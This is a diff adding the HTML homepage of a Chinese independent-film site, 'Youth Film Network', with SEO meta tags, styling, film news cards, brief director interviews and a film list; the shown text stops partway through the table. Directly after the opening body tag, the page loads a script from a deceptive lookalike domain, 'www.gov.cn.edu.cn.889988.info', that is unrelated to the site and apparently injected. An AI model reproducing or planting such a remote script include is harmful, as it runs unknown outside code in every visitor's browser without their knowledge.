@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="true">
+<meta name="MobileOptimized" content="360">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="青年电影网">
+<meta name="theme-color" content="#e9e3d8">
+<meta name="msapplication-navbutton-color" content="#e9e3d8">
+<title>青年电影网 —— 聚焦青年导演、青年题材与青年观众的独立电影内容平台</title>
+<meta name="description" content="青年电影网（https://qingniandianyingwang-zh.github.io）是一个面向青年群体与独立电影爱好者的内容平台，长期聚焦青年导演处女作、青年题材影像、短片与纪录片、校园影展、创投项目、电影节入围动态与青年影评人写作。内容涵盖新片速递、导演访谈、片单推荐、电影节资讯、短片展映、幕后制作与青年文化观察，为关注新人新作与独立表达的观众提供持续更新的索引与参考。">
+<meta name="keywords" content="青年电影网, qingniandianyingwang-zh.github.io, 青年导演, 青年题材电影, 独立电影平台, 新人新作, 青年影展, 短片与纪录片, 校园电影, 电影节入围, 青年影评人, 创投项目, 处女作电影, 青年文化观察">
+<meta name="description" lang="zh-Hant" content="青年電影網聚焦青年導演、青年題材與青年觀眾，整理獨立電影、短片、紀錄片與影展資訊。">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+<meta name="bingbot" content="index,follow,max-snippet:-1,max-image-preview:large,odr:1,idr:1">
+<meta name="slurp" content="index,follow">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<meta name="rating" content="general">
+<meta name="web_author" content="青年电影网">
+<meta name="organization" content="青年电影网">
+<meta name="category" content="艺术与娱乐, 电影与影像">
+<meta name="coverage" content="中国大陆">
+<meta name="target" content="青年观众, 独立电影爱好者, 青年创作者">
+<meta name="classification" content="Film, Independent Cinema, Youth Culture">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="青年电影网">
+<meta property="og:title" content="青年电影网 —— 青年导演、青年题材与青年观众的影像平台">
+<meta property="og:description" content="聚焦青年导演处女作、青年题材影像、短片与纪录片、校园影展、创投项目与青年影评人写作。">
+<meta property="og:url" content="https://qingniandianyingwang-zh.github.io">
+<meta property="og:updated_time" content="2026-10-09T09:00:00+08:00">
+<meta property="og:see_also" content="https://qingniandianyingwang-zh.github.io#fest">
+<meta property="article:section" content="独立电影">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="青年电影网">
+<meta name="twitter:description" content="聚焦青年导演、青年题材与青年观众的独立电影内容平台。">
+<link rel="canonical" href="https://qingniandianyingwang-zh.github.io">
+<link rel="original-source" href="https://qingniandianyingwang-zh.github.io">
+<link rel="author" href="https://qingniandianyingwang-zh.github.io#about">
+<link rel="bookmark" title="青年电影网" href="https://qingniandianyingwang-zh.github.io">
+<style>
+:root{
+  --paper:#e9e3d8; --paper2:#efeadd; --paper3:#f5f1e9;
+  --ink:#23201c; --ink2:#3d382f; --txt:#6b6457; --sub:#9a9385;
+  --line:#d9d0bf; --line2:#e3dccd;
+  --rust:#a64b2a; --rust2:#c26436; --olive:#5f6b3c; --olive2:#7a8a50;
+  --navy:#2c3e50; --mustard:#c79a2e; --plum:#7a3b4f; --teal:#2f6b63;
+  --sh:0 1px 2px rgba(35,32,28,.05),0 14px 36px rgba(35,32,28,.1);
+  --serif:"Songti SC","STSong","SimSun","Noto Serif CJK SC","WenQuanYi Micro Hei",serif;
+  --sans:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  --mono:"SF Mono",Consolas,"Liberation Mono",monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{background:var(--paper);color:var(--txt);font-family:var(--sans);font-size:14.5px;line-height:1.8}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+button{font-family:inherit;border:none;background:none;cursor:pointer;color:inherit}
+img{max-width:100%;display:block}
+::-webkit-scrollbar{width:9px;height:9px}
+::-webkit-scrollbar-thumb{background:var(--sub);border-radius:5px}
+
+/* ============ 顶部信息条 ============ */
+.infobar{
+  background:var(--ink);color:#c9c2b4;font-size:11.5px;letter-spacing:.3px;
+}
+.infobar .in{max-width:1440px;margin:0 auto;padding:8px 28px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.infobar a{color:#c9c2b4}
+.infobar a:hover{color:#fff}
+.infobar .clock{font-family:var(--mono);letter-spacing:.5px}
+
+/* ============ 报头 ============ */
+.mast{
+  border-bottom:3px double var(--ink);padding:34px 0 22px;position:relative;
+  background:radial-gradient(circle at 82% 12%,rgba(166,75,42,.07),transparent 42%),
+             radial-gradient(circle at 12% 88%,rgba(95,107,60,.07),transparent 40%);
+}
+.mast .in{max-width:1440px;margin:0 auto;padding:0 28px}
+.mast .row1{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:16px}
+.mast .word{
+  font-family:var(--serif);font-size:62px;font-weight:900;color:var(--ink);
+  letter-spacing:4px;line-height:1;display:flex;align-items:baseline;gap:14px;
+}
+.mast .word em{font-style:normal;font-size:14px;font-weight:400;color:var(--rust);letter-spacing:3px;border:1px solid var(--rust);padding:2px 8px;border-radius:2px}
+.mast .en{font-family:var(--serif);font-style:italic;font-size:15px;color:var(--sub);letter-spacing:2px;margin-top:10px}
+.mast .meta{text-align:right;font-size:12px;color:var(--ink2);line-height:2}
+.mast .meta b{display:block;font-family:var(--serif);font-size:14px;color:var(--ink);letter-spacing:1px}
+.mast .rule{display:flex;gap:0;margin-top:14px;border-top:1px solid var(--ink);padding-top:8px}
+.mast .rule span{
+  flex:1;text-align:center;font-family:var(--serif);font-size:12.5px;color:var(--ink2);
+  border-right:1px solid var(--line);letter-spacing:1px;
+}
+.mast .rule span:last-child{border-right:none}
+.mast .rule span a:hover{color:var(--rust)}
+
+/* ============ 布局 ============ */
+.wrap{max-width:1440px;margin:0 auto;padding:26px 28px 40px;display:grid;grid-template-columns:1.75fr 1fr;gap:34px;align-items:start}
+.left,.right{display:grid;gap:26px}
+
+/* 通用标题 */
+.kicker{display:flex;align-items:baseline;gap:10px;border-bottom:1px solid var(--ink);padding-bottom:9px;margin-bottom:18px}
+.kicker .no{font-family:var(--mono);font-size:10.5px;color:var(--rust);letter-spacing:1px}
+.kicker h2{font-family:var(--serif);font-size:22px;font-weight:900;color:var(--ink);letter-spacing:2px}
+.kicker .sub{font-size:11px;color:var(--sub);letter-spacing:1.5px;margin-left:auto}
+.kicker .sub a{color:var(--ink2);border-bottom:1px solid var(--line)}
+.kicker .sub a:hover{color:var(--rust);border-color:var(--rust)}
+
+/* 头条双栏 */
+.lede{display:grid;grid-template-columns:1.35fr 1fr;gap:26px}
+.lede .frame{
+  position:relative;aspect-ratio:4/3;background:linear-gradient(150deg,#cdc3b0,#a89c83);
+  border:1px solid var(--line);overflow:hidden;
+}
+.lede .frame::before{content:"";position:absolute;inset:0;background:
+  radial-gradient(circle at 30% 40%,rgba(255,255,255,.28),transparent 45%),
+  radial-gradient(circle at 72% 68%,rgba(35,32,28,.28),transparent 50%)}
+.lede .frame .caption{
+  position:absolute;left:0;right:0;bottom:0;background:linear-gradient(0deg,rgba(35,32,28,.92),rgba(35,32,28,.55));
+  color:#e9e3d8;padding:16px 18px 13px;
+}
+.lede .frame .caption .tag{font-size:10px;letter-spacing:2.5px;color:var(--mustard);text-transform:uppercase}
+.lede .frame .caption h3{font-family:var(--serif);font-size:20px;font-weight:800;line-height:1.5;margin-top:5px}
+.lede .frame .caption .by{font-size:11.5px;color:#c9c2b4;margin-top:6px}
+.lede .side-list li{border-top:1px solid var(--line2);padding:11px 0}
+.lede .side-list li:first-child{border-top:none;padding-top:0}
+.lede .side-list a{display:grid;grid-template-columns:34px 1fr;gap:12px;align-items:flex-start}
+.lede .side-list .n{font-family:var(--mono);font-size:13px;font-weight:800;color:var(--rust);border-top:2px solid var(--rust);padding-top:2px}
+.lede .side-list .tx b{display:block;font-size:14px;font-weight:700;color:var(--ink);line-height:1.55}
+.lede .side-list .tx span{font-size:11.5px;color:var(--sub);line-height:1.7}
+
+/* 卡片网格 */
+.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.card{border:1px solid var(--line);background:var(--paper3);transition:.25s}
+.card:hover{border-color:var(--ink);background:#fff}
+.card .thumb{aspect-ratio:16/10;position:relative;background:linear-gradient(150deg,#d6cdb9,#b0a58d)}
+.card .thumb.r2{background:linear-gradient(150deg,#c9b9a4,#9d8b70)}
+.card .thumb.r3{background:linear-gradient(150deg,#b9c2b0,#87917a)}
+.card .thumb.r4{background:linear-gradient(150deg,#c4b9bd,#9d8b98)}
+.card .thumb .ctag{
+  position:absolute;left:12px;top:12px;font-size:10px;letter-spacing:1.5px;color:#fff;
+  background:var(--ink);padding:3px 9px;
+}
+.card .thumb .ctag.r{background:var(--rust)}
+.card .thumb .ctag.o{background:var(--olive)}
+.card .thumb .ctag.p{background:var(--plum)}
+.card .thumb .date{position:absolute;right:12px;bottom:12px;background:rgba(35,32,28,.82);color:#e9e3d8;font-family:var(--mono);font-size:11px;padding:3px 8px}
+.card .bd{padding:15px 17px 17px}
+.card .bd h4{font-family:var(--serif);font-size:16px;font-weight:800;color:var(--ink);line-height:1.6}
+.card .bd p{font-size:12.5px;color:var(--txt);line-height:1.85;margin-top:8px}
+.card .bd .ft{display:flex;justify-content:space-between;font-size:11px;color:var(--sub);margin-top:12px;padding-top:10px;border-top:1px dashed var(--line)}
+.card .bd .ft a{color:var(--ink2);font-weight:600}
+
+/* 访谈问答 */
+.qa{border:1px solid var(--line);background:var(--paper2)}
+.qa .who{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;gap:16px;align-items:center}
+.qa .av{width:52px;height:52px;border-radius:50%;flex:none;background:linear-gradient(135deg,var(--olive),var(--teal));color:#fff;display:flex;align-items:center;justify-content:center;font-family:var(--serif);font-size:19px;font-weight:900}
+.qa .av.r2{background:linear-gradient(135deg,var(--rust),var(--mustard))}
+.qa .av.r3{background:linear-gradient(135deg,var(--plum),var(--rust))}
+.qa .who .tx b{display:block;font-family:var(--serif);font-size:15px;color:var(--ink)}
+.qa .who .tx span{font-size:11.5px;color:var(--sub)}
+.qa .body{padding:18px 20px}
+.qa .body .q{font-family:var(--serif);font-size:13.5px;color:var(--ink2);line-height:2;margin-bottom:12px;padding-left:26px;position:relative}
+.qa .body .q::before{content:"问";position:absolute;left:0;top:3px;font-size:10px;background:var(--ink);color:var(--paper);width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:var(--sans)}
+.qa .body .a{font-size:13px;color:var(--txt);line-height:2;padding-left:26px;position:relative}
+.qa .body .a::before{content:"答";position:absolute;left:0;top:3px;font-size:10px;background:var(--rust);color:#fff;width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:var(--sans)}
+.qa .body .a strong{color:var(--ink);font-weight:700}
+
+/* 时间表 */
+.timeline{border-left:2px solid var(--ink)}
+.timeline .it{position:relative;padding:0 0 22px 26px}
+.timeline .it::before{content:"";position:absolute;left:-7px;top:7px;width:12px;height:12px;background:var(--paper);border:2px solid var(--rust);border-radius:50%}
+.timeline .it.o::before{border-color:var(--olive)}
+.timeline .it.p::before{border-color:var(--plum)}
+.timeline .it .when{font-family:var(--mono);font-size:11.5px;color:var(--rust);letter-spacing:1px}
+.timeline .it.o .when{color:var(--olive)}
+.timeline .it.p .when{color:var(--plum)}
+.timeline .it h4{font-family:var(--serif);font-size:15.5px;font-weight:800;color:var(--ink);margin-top:3px}
+.timeline .it p{font-size:12.5px;color:var(--txt);line-height:1.85;margin-top:5px}
+
+/* 片单表 */
+.films{width:100%;border-collapse:collapse;font-size:13px}
+.films th{text-align:left;font-family:var(--serif);font-size:11.5px;letter-spacing:1.5px;color:var(--sub);padding:0 12px 11px;border-bottom:1px solid var(--ink);font-weight:600;white-space:nowrap}
+.films td{padding:13px 12px;border-bottom:1px solid var(--line2);vertical-align:top;color:var(--txt);line-height:1.6}
+.films tbody tr{transition:.13s}
+.films tbody tr:hover{background:var(--paper2)}
+.films .nm{font-family:var(--serif);font-size:14.5px;font-weight:800;color:var(--ink)}
+.films .nm small{display:block;font-size:11px;color:var(--sub);font-weight:400;margin-top:2px;font-family:var(--sans)}
+.films .yr{font-family:var(--mono);font-size:12.5px;color:var(--ink2);white-space:nowrap}
+.films .tg{font-size:11.5px;color:var(--ink2)}
+.films .tg i{font-style:normal;background:var(--paper2);border:1px solid var(--line);padding:1px 6px;border-radius:2px;margin-right:4px;white-space:nowrap}
+.films .st{font-size:11.5px;white-space:nowrap}
+.films .st.live{color:var(--rust)} .films .st.soon{color:var(--olive)} .films .st.end{color:var(--sub)}
+
+/* 章节 */
+.section{background:var(--paper3);border:1px solid var(--line);padding:20px 22px}
+.section + .section{margin-top:26px}
+.section.solid{background:var(--ink);color:#c9c2b4;border-color:var(--ink)}
+.section.solid .kicker{border-bottom-color:#c9c2b4}
+.section.solid .kicker h2{color:#f5f1e9}
+.section.solid .kicker .no{color:var(--mustard)}
+.section.solid .sub a{color:#c9c2b4;border-color:#5a5347}
+
+/* 短片展映方块 */
+.tiles{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.tile{border:1px solid var(--line);background:var(--paper);padding:15px;transition:.22s}
+.tile:hover{border-color:var(--rust);transform:translateY(-4px)}
+.tile .dur{font-family:var(--mono);font-size:10.5px;color:var(--rust);letter-spacing:1px}
+.tile h4{font-family:var(--serif);font-size:15.5px;font-weight:800;color:var(--ink);margin-top:5px;line-height:1.5}
+.tile p{font-size:12px;color:var(--sub);margin-top:7px;line-height:1.8}
+
+/* 数字块 */
+.figs{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.fig{border-top:2px solid var(--mustard);padding:14px 0}
+.fig .n{font-family:var(--serif);font-size:30px;font-weight:900;color:var(--paper);letter-spacing:-.5px}
+.fig .n small{font-size:13px;font-weight:600;margin-left:3px}
+.fig .l{font-size:12px;color:#c9c2b4;margin-top:3px}
+
+/* 标签 */
+.cloud{padding:4px 0}
+.cloud a{display:inline-block;margin:0 12px 11px 0;font-family:var(--serif);color:var(--ink2);border-bottom:1px solid var(--line);transition:.15s}
+.cloud a:hover{color:var(--rust);border-color:var(--rust)}
+.cloud a.xl{font-size:22px;font-weight:900}
+.cloud a.lg{font-size:17px;font-weight:700}
+.cloud a.md{font-size:14px}
+
+/* 提示条 */
+.note{
+  border:1px solid var(--line);border-left:4px solid var(--rust);background:var(--paper2);
+  padding:14px 17px;font-size:13px;color:var(--ink2);line-height:1.85;display:grid;
+  grid-template-columns:44px 1fr;gap:12px;
+}
+.note .k{font-family:var(--serif);font-size:12px;font-weight:800;color:var(--rust);letter-spacing:1px;padding-top:2px}
+.note.g{border-left-color:var(--olive)}
+.note.g .k{color:var(--olive)}
+.note.p{border-left-color:var(--plum)}
+.note.p .k{color:var(--plum)}
+
+/* 侧边区块 */
+.rblk{border-top:3px solid var(--ink);padding-top:13px}
+.rblk .kh{font-family:var(--serif);font-size:15px;font-weight:800;color:var(--ink);letter-spacing:1px;margin-bottom:13px;display:flex;align-items:baseline;gap:8px}
+.rblk .kh span{font-size:10px;color:var(--sub);font-weight:400;letter-spacing:1.5px}
+.rblk + .rblk{margin-top:26px}
+
+.mini li{padding:11px 0;border-top:1px solid var(--line2)}
+.mini li:first-child{padding-top:0;border-top:none}
+.mini a{display:block}
+.mini .t{font-size:13.5px;font-weight:600;color:var(--ink);line-height:1.6;display:block;transition:.15s}
+.mini a:hover .t{color:var(--rust)}
+.mini .b{font-size:11px;color:var(--sub);margin-top:4px;display:flex;gap:10px;flex-wrap:wrap}
+.mini .b i{font-style:normal;font-family:var(--mono);color:var(--rust)}
+
+.quote{
+  background:var(--ink);color:#e9e3d8;padding:20px 22px;font-family:var(--serif);font-size:15px;
+  line-height:2;position:relative;
+}
+.quote::before{content:"“";position:absolute;left:14px;top:6px;font-size:44px;color:var(--mustard);line-height:1;font-family:var(--serif)}
+.quote p{padding-left:22px}
+.quote cite{display:block;font-size:11.5px;color:#9a9385;font-style:normal;margin-top:12px;padding-left:22px;letter-spacing:1px}
+
+.pager{display:flex;gap:6px;margin-top:18px;flex-wrap:wrap}
+.pager a{
+  font-family:var(--mono);font-size:12px;color:var(--ink2);border:1px solid var(--line);
+  width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:var(--paper3);transition:.15s;
+}
+.pager a.on,.pager a:hover{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+.pager a.w{width:auto;padding:0 12px}
+
+.about dl{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line)}
+.about dt,.about dd{background:var(--paper3);padding:10px 13px;font-size:12.5px}
+.about dt{font-family:var(--serif);color:var(--ink);font-weight:700}
+.about dd{color:var(--txt)}
+.about .url{font-family:var(--mono);font-size:11.5px;color:var(--rust);word-break:break-all}
+
+details.f{background:var(--paper3);border:1px solid var(--line);margin-bottom:9px}
+details.f summary{cursor:pointer;padding:14px 16px;font-size:14px;font-weight:700;color:var(--ink);display:flex;gap:12px;align-items:flex-start;list-style:none}
+details.f summary::-webkit-details-marker{display:none}
+details.f summary .q{flex:none;font-family:var(--mono);font-size:11px;background:var(--ink);color:var(--paper);width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-top:2px}
+details.f summary .ar{margin-left:auto;color:var(--sub);font-size:11px;transition:.2s;flex:none}
+details.f[open] summary .ar{transform:rotate(180deg);color:var(--rust)}
+details.f .an{padding:0 16px 15px 48px;font-size:13px;color:var(--txt);line-height:2}
+details.f .an a{color:var(--rust);border-bottom:1px solid rgba(166,75,42,.3)}
+
+/* 页脚 */
+footer{border-top:4px double var(--ink);background:var(--ink);color:#9a9385;margin-top:30px}
+footer .in{max-width:1440px;margin:0 auto;padding:40px 28px 26px}
+footer .cols{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:40px}
+footer .brand .word{font-family:var(--serif);font-size:34px;font-weight:900;color:#f5f1e9;letter-spacing:2px;display:flex;align-items:baseline;gap:10px}
+footer .brand .word em{font-style:normal;font-size:11px;color:var(--mustard);border:1px solid var(--mustard);padding:1px 7px}
+footer .brand .en{font-family:var(--serif);font-style:italic;font-size:13px;color:#6b6457;letter-spacing:1.5px;margin-top:6px}
+footer .brand p{font-size:12.5px;color:#9a9385;line-height:2;margin-top:14px}
+footer .brand .u{display:inline-block;margin-top:12px;font-family:var(--mono);font-size:11px;color:var(--mustard);border-bottom:1px solid #5a5347;padding-bottom:3px}
+footer h5{font-family:var(--serif);font-size:14px;font-weight:800;color:#e9e3d8;letter-spacing:1.5px;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid #5a5347}
+footer ul li{margin-bottom:8px}
+footer ul a{font-size:12.5px;color:#9a9385;transition:.15s}
+footer ul a:hover{color:var(--mustard)}
+footer .legal{max-width:1440px;margin:34px auto 0;padding:18px 28px 0;border-top:1px solid #5a5347;display:grid;grid-template-columns:1fr 1fr;gap:16px;font-size:11.5px;color:#6b6457;line-height:2}
+footer .legal a{color:#9a9385}
+footer .legal a:hover{color:var(--mustard)}
+footer .legal .r{text-align:right}
+
+/* ============ 响应式 ============ */
+@media (max-width:1180px){
+  .wrap{grid-template-columns:1fr;gap:30px}
+  .right{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+  .rblk + .rblk{margin-top:0}
+}
+@media (max-width:860px){
+  .mast .word{font-size:40px;letter-spacing:2px;gap:8px}
+  .mast .word em{display:none}
+  .mast .meta{text-align:left}
+  .mast .rule span{font-size:11px;padding:0 4px}
+  .lede{grid-template-columns:1fr;gap:20px}
+  .grid,.tiles,.figs,.about dl{grid-template-columns:1fr 1fr}
+  .right{grid-template-columns:1fr}
+}
+@media (max-width:560px){
+  .infobar .in{padding:8px 16px;font-size:10.5px}
+  .mast{padding:24px 0 18px}
+  .mast .in,.wrap,.footer-in,.legal{padding-left:16px!important;padding-right:16px!important}
+  .mast .word{font-size:32px}
+  .mast .rule{flex-wrap:wrap;gap:6px 0}
+  .mast .rule span{flex:1 1 33%;border:none;padding:4px 0}
+  .kicker h2{font-size:18px}
+  .grid,.tiles,.figs,.about dl,.cols,.legal{grid-template-columns:1fr!important;gap:20px}
+  .card .bd h4{font-size:15px}
+  .films th.hide,.films td.hide{display:none}
+  footer .brand .word{font-size:28px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 信息条 -->
+<div class="infobar">
+  <div class="in">
+    <span>青年电影网 · 独立电影与青年影像内容平台</span>
+    <span class="clock">2026 年 10 月 9 日 周五 · 每日更新</span>
+    <span><a href="https://qingniandianyingwang-zh.github.io">https://qingniandianyingwang-zh.github.io</a> · <a href="#about">投稿与联系</a></span>
+  </div>
+</div>
+
+<!-- 报头 -->
+<header class="mast">
+  <div class="in">
+    <div class="row1">
+      <div>
+        <div class="word">青年电影网<em>YOUTH CINEMA</em></div>
+        <div class="en">Youth Film Network — Independent Cinema, Emerging Voices, Festival News</div>
+      </div>
+      <div class="meta">
+        <b>本期要目</b>
+        本期聚焦「新人新作与处女作」<br>
+        共 7 组专题 · 14 篇作者写作 · 更新于 10 月 9 日<br>
+        <span style="color:var(--rust);font-family:var(--mono);font-size:11px">ISSN 2026-1009（内部期号）</span>
+      </div>
+    </div>
+    <div class="rule">
+      <span><a href="#lede">头条观察</a></span>
+      <span><a href="#new">新片速递</a></span>
+      <span><a href="#talk">导演访谈</a></span>
+      <span><a href="#list">片单与榜单</a></span>
+      <span><a href="#fest">影展与创投</a></span>
+      <span><a href="#short">短片展映</a></span>
+      <span><a href="#tag">题材索引</a></span>
+      <span><a href="#faq">读者问答</a></span>
+      <span><a href="#about">关于本站</a></span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- ========== 左栏 ========== -->
+  <main class="left">
+
+    <!-- 头条 -->
+    <section id="lede">
+      <div class="kicker">
+        <span class="no">No.01</span>
+        <h2>头条观察</h2>
+        <span class="sub">本栏目关注青年导演与青年题材影像</span>
+      </div>
+      <div class="lede">
+        <div class="frame">
+          <div class="caption">
+            <div class="tag">Editor's Letter · 编者按</div>
+            <h3>当「青年」不再是一个营销标签：<br>从今年的处女作看创作者的真实处境</h3>
+            <div class="by">文 / 本刊编辑组 · 预计阅读 8 分钟</div>
+          </div>
+        </div>
+        <ul class="side-list">
+          <li>
+            <a href="#"><span class="n">01</span><span class="tx"><b>毕业作品与商业长片之间，缺的从来不是才华</b><span>一位青年导演在完成三部短片、两次创投路演之后的自述</span></span></a>
+          </li>
+          <li>
+            <a href="#"><span class="n">02</span><span class="tx"><b>低预算不是风格，而是约束下的选择</b><span>六位导演谈如何在预算、周期与表达之间做取舍</span></span></a>
+          </li>
+          <li>
+            <a href="#"><span class="n">03</span><span class="tx"><b>青年题材不等于校园题材</b><span>从职场新人、小镇青年到城市漂泊者的影像呈现</span></span></a>
+          </li>
+          <li>
+            <a href="#"><span class="n">04</span><span class="tx"><b>为什么「第一部」总被反复讨论</b><span>处女作标签带来的关注与负担</span></span></a>
+          </li>
+          <li>
+            <a href="#"><span class="n">05</span><span class="tx"><b>流媒体之外，短片仍有自己的观众</b></span></a>
+          </li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- 新片速递 -->
+    <section id="new">
+      <div class="kicker">
+        <span class="no">No.02</span>
+        <h2>新片速递</h2>
+        <span class="sub"><a href="#">本周 6 部新片 #</a> · <a href="#">全部新片 #</a></span>
+      </div>
+      <div class="grid">
+        <article class="card">
+          <div class="thumb"><span class="ctag">剧情 · 处女作</span><span class="date">10.09 公映</span></div>
+          <div class="bd">
+            <h4>一部关于「回家」的电影，为什么让观众在第三幕沉默</h4>
+            <p>新人导演用七年时间完成剧本与拍摄，全片只用了 14 场戏。它不解释人物的选择，只把选择之后发生的事摊开给你看。</p>
+            <div class="ft"><span>中国 · 118 分钟</span><a href="#">查看完整条目 #</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb r2"><span class="ctag r">纪录 · 长片</span><span class="date">10.11 艺联</span></div>
+          <div class="bd">
+            <h4>跟着一支民间乐队走了三年，剪出来的却是一部关于等待的电影</h4>
+            <p>没有解说词，没有采访，只有四季的声音与不断推迟的演出。这是今年最不急的纪录片。</p>
+            <div class="ft"><span>中国大陆 · 96 分钟</span><a href="#">查看完整条目 #</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb r3"><span class="ctag o">短片 · 毕业作品</span><span class="date">10.15 展映</span></div>
+          <div class="bd">
+            <h4>22 分钟，讲清了一对母女之间那句始终没说出口的话</h4>
+            <p>北京电影学院 2026 届毕业作品，已在两个海外短片节入围。镜头始终保持在门框之外。</p>
+            <div class="ft"><span>短片 · 22 分钟</span><a href="#">查看完整条目 #</a></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb r4"><span class="ctag p">悬疑 · 低成本</span><span class="date">10.18 网络</span></div>
+          <div class="bd">
+            <h4>只用一间办公室和一个周末，讲完了职场里最不体面的那部分</h4>
+            <p>全片制作成本公开为 48 万元。它证明了预算约束本身可以成为一种叙事节奏。</p>
+            <div class="ft"><span>中国 · 89 分钟</span><a href="#">查看完整条目 #</a></div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 导演访谈 -->
+    <section id="talk">
+      <div class="kicker">
+        <span class="no">No.03</span>
+        <h2>导演访谈</h2>
+        <span class="sub"><a href="#">往期访谈 #</a> · <a href="#">邀约投稿 #</a></span>
+      </div>
+      <div class="grid">
+        <article class="qa">
+          <div class="who">
+            <div class="av">陈</div>
+            <div class="tx"><b>陈默，导演</b><span>《夜班车》导演 · 第三部长片</span></div>
+          </div>
+          <div class="body">
+            <p class="q">你的前三部作品都在讲「离开一座城市」，是有意识的吗？</p>
+            <p class="a"><strong>不是一开始就有的。</strong>剪到第二部的时候我才发现，主角的行李一直没放下。后来我干脆不再假装这是巧合，第三部直接把镜头对准了车站。</p>
+          </div>
+        </article>
+        <article class="qa">
+          <div class="who">
+            <div class="av r2">林</div>
+            <div class="tx"><b>林知夏，编剧 / 导演</b><span>首部长片《周末修理铺》入围 First 青年电影展</span></div>
+          </div>
+          <div class="body">
+            <p class="q">从短片转向长片，最难的是什么？</p>
+            <p class="a"><strong>是把「好点子」撑成一个人的耐心。</strong>短片靠一个念头就能立住，长片要让你每天走进同一个房间都不厌倦。我花了十一个月才习惯这件事。</p>
+          </div>
+        </article>
+        <article class="qa">
+          <div class="who">
+            <div class="av r3">赵</div>
+            <div class="tx"><b>赵远，纪录片导演</b><span>《等待一场演出》导演</span></div>
+          </div>
+          <div class="body">
+            <p class="q">拍了三年，有没有想过放弃？</p>
+            <p class="a"><strong>想过，但不是因为素材不够。</strong>是有一段时间我觉得自己在打扰。后来我把那段最不舒服的拍摄剪了进去，影片才第一次有了呼吸。</p>
+          </div>
+        </article>
+        <article class="qa">
+          <div class="who">
+            <div class="av">周</div>
+            <div class="tx"><b>周屿，制片人</b><span>青年导演扶持计划评审</span></div>
+          </div>
+          <div class="body">
+            <p class="q">看创投方案时，最容易被忽略的短板是什么？</p>
+            <p class="a"><strong>不是故事，是主创对制作周期的判断。</strong>很多人能讲清楚自己要什么，却说不出哪一页剧本需要几天。这一点一旦失准，整部片子的语气都会变形。</p>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- 片单与榜单 -->
+    <section id="list">
+      <div class="kicker">
+        <span class="no">No.04</span>
+        <h2>片单与榜单</h2>
+        <span class="sub"><a href="#">2026 年度推荐 #</a> · <a href="#">按题材筛选 #</a></span>
+      </div>
+      <div class="section">
+        <table class="films">
+          <thead>
+            <tr><th>影片 / 导演</th><th class="hide">年份</th><th class="hide">题材与地区</th><th class="hide">看点</th><th>状态</th></tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><span class="nm">夜班车<small>陈默 执导 · 第三部长片</small></span></td>
+              <td class="yr hide">2026</td>
+              <td class="tg hide"><i>剧情</i><i>公路</i><span>中国大陆</span></td>
+              <td class="hide">全片 14 场戏，用季节替代配乐</td>
+              <td><span class="st live">在映</span></td>
+            </tr>
+            <tr>
+              <td><span class="nm">等待一场演出<small>赵远 执导 · 纪录片长片</small></span></td>
+              <td class="yr hide">2026</td>
+              <td class="tg hide"><i>纪录</i><i>音乐</i><span>中国大陆</span></td>
+              <td class="hide">无解说、无采访，三年跟拍</td>
+              <td><span class="st soon">艺联专线</span></td>
+            </tr>
+            <tr>
+              <td><span class="nm">周末修理铺<small>林知夏 执导 · 首部长片</small></span></td>
+              <td class="yr hide">2026</td>
+              <td class="tg hide"><i>剧情</i><i>家庭</i><span>中国大陆</span></td>
+              <td class="hide">First 青年电影展入围</td>
+              <td><span class="st soon">定档 10.25</span></td>
+            </tr>
+            <tr>
+              <td><span class="nm">母亲的房门<small>苏念 执导 · 毕业短片</small></span></td>
+              <td class="yr hide">2026</td>
+              <td class="tg hide"><i>短片</i><i>家庭</i><span>中国大陆</span></td>
+              <td class="hide">22 分钟 · 两个短片节入围</td>
+              <td><span class="st live">在线展映</span></td>
+            </tr>
+            <tr>
+              <td><span class="nm">办公室的最后一个周末<small>何川 执导 · 低成本长片</small></span></td>
+              <td class="yr hide">2026</td>
+              <td class="tg hide"><i>悬疑</i><i>职场</i><span>中国大陆</span></td>
+              <td class="hide">单场景 · 制作成本公开</td>
+              <td><span class="st live">网络平台</span></td>
